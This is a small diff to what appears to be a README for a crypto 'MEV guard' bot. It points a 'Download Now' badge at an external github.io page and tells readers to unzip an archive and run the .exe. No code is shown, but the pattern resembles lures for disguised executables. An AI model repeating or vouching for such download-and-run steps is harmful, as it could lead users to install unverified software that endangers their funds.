@@ -12,7 +12,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file to start the application.  
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://mev-guard-bot.github.io/.github/)
 
 ## 📸 Overview
 ![Screenshot 1](https://celebrated-gift-f83e5c9419.media.strapiapp.com/3_how_to_avoid_mev_bots_523b1b6663.webp)  
